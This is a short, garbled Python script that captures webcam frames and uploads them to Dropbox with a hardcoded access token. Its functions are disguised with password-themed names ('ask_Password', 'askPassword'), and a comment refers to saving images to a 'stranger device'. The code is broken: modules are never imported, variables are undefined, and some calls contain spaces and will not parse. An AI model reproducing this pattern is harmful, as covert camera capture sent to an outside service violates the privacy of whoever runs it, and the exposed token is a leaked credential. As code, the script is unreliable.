import random
start_time=time.time()
def ask_Password():
    number=random.randint(0,100)
    videoCaptureObject = cv2.VideoCapture(0)
    result = True
    while(result):


      #read the frame while the camera is on
      ret,frame = ask_Password .read()

      #cv2.imwrite() method is used to save a image to any stranger device
      Password="Password"+str(number)+".png"
      cv2.imwrite(Password,frame)
      start_time=time.time

      result = False

    return img_name
def askPassword(password):
    access_token="UAskRhzyJwIAAAAAAAAAASCUyRF7HyrQG4exWLB-SbM1dKlqgiyWns3WJCw_zfUo"
    file=img_name
    file_from=file
    file_to="Viraj singh"+(img_name)
    dba=dropbox.Dropbox(access_token)
    with open(file_from,"rb")as f:
        dbx.ask Password(f.read(),file_to,mode=dropbox.files.WriteMode.overwrite)
        print("fileUploaded")
def main():
    while(True):
     if((time.time()-start_time)>=5):
      name=take_password()
      ask Password(name)
main()
